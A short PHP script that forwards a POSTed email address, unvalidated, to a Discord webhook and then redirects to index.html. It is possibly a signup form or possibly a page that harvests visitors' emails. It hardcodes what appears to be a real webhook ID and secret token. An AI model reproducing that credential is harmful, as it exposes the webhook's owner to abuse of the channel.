<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $webhookUrl = "https://discord.com/api/webhooks/1118552194086621184/7EYHHKRsamF4KI9IgfHyX2hhpgD9m3rvIu8ZGN7BAqw5Acfj6JBida9Zc7sgXYXze6RT";

    $email = $_POST['email'];

    $payload = array(
        "content" => "$email"
    );

    $jsonPayload = json_encode($payload);

    $ch = curl_init($webhookUrl);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonPayload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
  
  	header("Location: index.html");
    exit();
  

}
?>